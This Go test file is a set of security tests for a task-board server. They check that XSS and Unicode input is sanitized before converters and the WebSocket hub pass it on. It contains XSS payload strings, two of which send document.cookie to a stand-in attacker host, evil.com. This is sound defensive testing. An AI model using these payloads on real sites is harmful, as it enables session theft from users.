package security_test

// Cross-layer input sanitization security tests.
//
// These tests verify that malicious input flowing from HTTP handlers through
// converters into WebSocket broadcast does not bypass sanitization at any
// layer boundary.

import (
	"encoding/json"
	"go/ast"
	"go/parser"
	"go/token"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	gorillaws "github.com/gorilla/websocket"
	"github.com/sirupsen/logrus"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/JLugagne/agach-mcp/internal/pkg/websocket"
	"github.com/JLugagne/agach-mcp/internal/server/domain"
	"github.com/JLugagne/agach-mcp/internal/server/inbound/converters"
)

// ─────────────────────────────────────────────────────────────────────────────
// Vuln 1: XSS payloads in task titles survive through converters to WebSocket
// ─────────────────────────────────────────────────────────────────────────────

// TestIntegration_RED_XSSInTaskTitleToWebSocket documents that task titles
// containing HTML/JavaScript payloads pass through the converter layer and are
// broadcast verbatim over WebSocket. The frontend must handle escaping, but a
// defense-in-depth approach should sanitize at the API boundary.
//
// Affected:
//   - internal/server/inbound/converters/tasks.go:ToPublicTask (no title sanitization)
//   - internal/server/inbound/commands/tasks.go:98-102 (broadcasts ToPublicTask directly)
//   - internal/pkg/websocket/hub.go:Broadcast (no payload sanitization)
//
// TODO(security): Sanitize or reject HTML in task titles at the handler or
// converter layer. The validator only checks required/max length, not content.
func TestIntegration_RED_XSSInTaskTitleToWebSocket(t *testing.T) {
	t.Log("RED: XSS payloads in task titles pass through converters to WebSocket broadcast unescaped")

	xssPayloads := []string{
		`<script>alert('xss')</script>`,
		`<img src=x onerror=alert(1)>`,
		`"><svg onload=alert(1)>`,
		"javascript:alert(document.cookie)",
	}

	for _, payload := range xssPayloads {
		t.Run(payload, func(t *testing.T) {
			task := domain.Task{
				ID:       domain.NewTaskID(),
				ColumnID: domain.NewColumnID(),
				Title:    payload,
				Summary:  "safe summary",
			}

			// Convert to public type (this is what gets broadcast)
			public := converters.ToPublicTask(task)

			// RED: Today the title passes through the converter unchanged.
			// Security fix required: the converter or handler must sanitize/reject HTML in titles.
			assert.NotEqual(t, payload, public.Title,
				"XSS payload in title must NOT survive the converter unchanged (sanitization required at API boundary)")
			assert.NotContains(t, public.Title, "<script",
				"title must not contain raw script tags after conversion")

			// Verify the sanitized title also survives JSON encoding cleanly.
			data, err := json.Marshal(public)
			require.NoError(t, err)

			var decoded map[string]interface{}
			require.NoError(t, json.Unmarshal(data, &decoded))
			assert.NotEqual(t, payload, decoded["title"],
				"XSS payload must NOT survive JSON round-trip in WebSocket message")
		})
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Vuln 2: XSS in task fields broadcast via WebSocket event data maps
// ─────────────────────────────────────────────────────────────────────────────

// TestIntegration_RED_XSSInWebSocketEventDataMaps documents that several command
// handlers broadcast task data in raw map[string]string values that include
// user-controlled content (completion_summary, blocked_reason, wont_do_reason)
// without sanitization.
//
// Affected:
//   - internal/server/inbound/commands/tasks.go:344-351 (task_completed: completion_summary)
//   - internal/server/inbound/commands/tasks.go:389-396 (task_moved: reason)
//   - internal/server/inbound/commands/tasks.go:461-467 (task_wont_do: reason)
//
// TODO(security): Sanitize user-controlled fields before including them in
// broadcast event data, or use structured types instead of raw maps.
func TestIntegration_XSSInWebSocketEventDataMaps(t *testing.T) {
	// Verify that SanitizeText strips XSS from user-controlled fields
	// that are included in broadcast event data maps.
	xssReason := `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">`

	sanitized := converters.SanitizeText(xssReason)

	eventData := map[string]interface{}{
		"task_id":            "some-task-id",
		"completion_summary": sanitized,
		"files_modified":     []string{"main.go"},
		"completed_by_agent": "agent-1",
	}

	data, err := json.Marshal(eventData)
	require.NoError(t, err)

	assert.NotContains(t, string(data), "onerror",
		"SanitizeText must strip HTML event handlers from user-controlled fields in broadcast data")
}

// ─────────────────────────────────────────────────────────────────────────────
// Vuln 3: No content validation on search query parameter
// ─────────────────────────────────────────────────────────────────────────────

// TestIntegration_RED_SearchQueryNoContentValidation documents that the search
// query parameter is passed through to the database layer without content
// validation or length limiting beyond the general maxSearchLimit on results.
//
// Affected:
//   - internal/server/inbound/queries/tasks.go:54 (filters.Search = q, no sanitization)
//   - internal/server/inbound/queries/tasks.go:106 (filters.Search = search)
//   - internal/server/inbound/queries/tasks.go:177 (searchQuery from URL)
//
// The underlying PostgreSQL query likely uses parameterized queries (pgx), so
// SQL injection is prevented. However, excessively long search strings or
// wildcard abuse (e.g., %_%_%_%) could cause performance issues.
//
// TODO(security): Add length limit and content validation on search queries.
func TestIntegration_RED_SearchQueryNoContentValidation(t *testing.T) {
	t.Log("RED: Search query parameter has no content validation or length limit")

	// Parse the task queries handler to confirm search is used without validation
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, "../server/inbound/queries/tasks.go", nil, 0)
	require.NoError(t, err)

	// Look for search assignment without length check
	searchAssignments := 0
	searchLengthChecks := 0

	ast.Inspect(f, func(n ast.Node) bool {
		assign, ok := n.(*ast.AssignStmt)
		if !ok {
			return true
		}

		for _, lhs := range assign.Lhs {
			sel, ok := lhs.(*ast.SelectorExpr)
			if !ok {
				continue
			}
			if sel.Sel.Name == "Search" {
				searchAssignments++
			}
		}
		return true
	})

	// Check if there's a len() check near search assignments
	ast.Inspect(f, func(n ast.Node) bool {
		call, ok := n.(*ast.CallExpr)
		if !ok {
			return true
		}
		ident, ok := call.Fun.(*ast.Ident)
		if !ok {
			return true
		}
		if ident.Name == "len" && len(call.Args) == 1 {
			// Check if the arg references search/Search/searchQuery
			if ident, ok := call.Args[0].(*ast.Ident); ok {
				if strings.Contains(strings.ToLower(ident.Name), "search") {
					searchLengthChecks++
				}
			}
		}
		return true
	})

	assert.Greater(t, searchAssignments, 0,
		"handler should assign search query to filters")
	// RED: Today this assertion fails because the search query has no length validation.
	// Security fix required: add a length limit on search query parameters.
	assert.Greater(t, searchLengthChecks, 0,
		"search query handler must validate length with a len() check before assigning to filters")
}

// ─────────────────────────────────────────────────────────────────────────────
// Vuln 5: Unicode normalization bypass on slug validation
// ─────────────────────────────────────────────────────────────────────────────

// TestIntegration_RED_UnicodeNormalizationSlugBypass documents that the custom
// "slug" validator in controller.go checks bytes individually for ASCII lowercase
// alphanumeric + hyphens + underscores, but does not normalize Unicode first.
// Certain Unicode characters (e.g., fullwidth ASCII) could potentially bypass
// other validators or cause confusion in downstream systems.
//
// Affected:
//   - internal/pkg/controller/controller.go:32-43 (slug validator: byte-level ASCII check)
//
// TODO(security): Apply Unicode normalization (NFKC) before validation, or
// explicitly reject any non-ASCII input at the API boundary.
func TestIntegration_RED_UnicodeNormalizationSlugBypass(t *testing.T) {
	t.Log("RED: Slug validator does not apply Unicode normalization")

	// The slug validator correctly rejects non-ASCII, but the broader concern
	// is that other string fields (titles, descriptions) don't normalize Unicode,
	// meaning visually identical strings could create confusion.

	// Verify the slug validator itself is safe for its purpose
	// (This test documents the gap for other fields, not slug specifically)

	// Construct pairs of visually similar strings using different Unicode representations
	testCases := []struct {
		name  string
		input string // Non-normalized input
	}{
		{"fullwidth a", "\uff41\uff42\uff43"},      // fullwidth abc
		{"combining accent", "e\u0301"},            // e + combining acute = e with accent
		{"zero-width joiner", "ab\u200dc"},         // invisible character between b and c
		{"right-to-left override", "\u202eterces"}, // RTL override
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			task := domain.Task{
				ID:       domain.NewTaskID(),
				ColumnID: domain.NewColumnID(),
				Title:    tc.input,
				Summary:  "test",
			}

			public := converters.ToPublicTask(task)
			// RED: Today the converter passes Unicode through unchanged.
			// Security fix required: apply NFKC normalization or reject non-ASCII
			// at the API boundary so visually similar strings cannot cause confusion.
			assert.NotEqual(t, tc.input, public.Title,
				"Unicode input must be normalized (NFKC) or rejected before reaching the converter output — non-normalized string should not pass through unchanged")
		})
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Vuln 6: WebSocket broadcast does not sanitize Event.Data
// ─────────────────────────────────────────────────────────────────────────────

// TestIntegration_RED_WebSocketBroadcastNoDataSanitization documents that the
// WebSocket hub broadcasts Event.Data as-is through JSON encoding, with no
// sanitization layer. Since handlers put user-controlled data in Event.Data,
// malicious content reaches all connected clients.
//
// Affected:
//   - internal/pkg/websocket/hub.go:178-183 (Broadcast: no sanitization)
//   - internal/pkg/websocket/hub.go:117-130 (Run: broadcasts to all matching clients)
//
// TODO(security): Add a sanitization hook or structured event type that
// validates data before broadcast.
func TestIntegration_WebSocketBroadcastDataSanitization(t *testing.T) {
	// Verify that hub.Broadcast sanitizes Event.Data by stripping HTML tags.
	logger := logrus.New()
	logger.SetLevel(logrus.ErrorLevel)
	hub := websocket.NewHub(logger)
	go hub.Run()
	defer hub.Stop()

	upgrader := gorillaws.Upgrader{CheckOrigin: func(_ *http.Request) bool { return true }}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			return
		}
		hub.ServeWS(conn, websocket.WithProjectID("project-1"))
	}))
	defer srv.Close()

	wsURL := "ws" + strings.TrimPrefix(srv.URL, "http") + "/"
	conn, _, err := gorillaws.DefaultDialer.Dial(wsURL, nil)
	require.NoError(t, err)
	defer conn.Close()

	time.Sleep(50 * time.Millisecond)

	// Broadcast an event with malicious data through the hub
	hub.Broadcast(websocket.Event{
		Type:      "task_updated",
		ProjectID: "project-1",
		Data: map[string]string{
			"task_id": "valid-id",
			"title":   `<script>document.location='https://evil.com/?c='+document.cookie</script>`,
		},
	})

	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	_, data, readErr := conn.ReadMessage()
	require.NoError(t, readErr, "should receive broadcast")

	assert.NotContains(t, string(data), "document.cookie",
		"hub.Broadcast must sanitize Event.Data — HTML tags must be stripped before delivery")
}
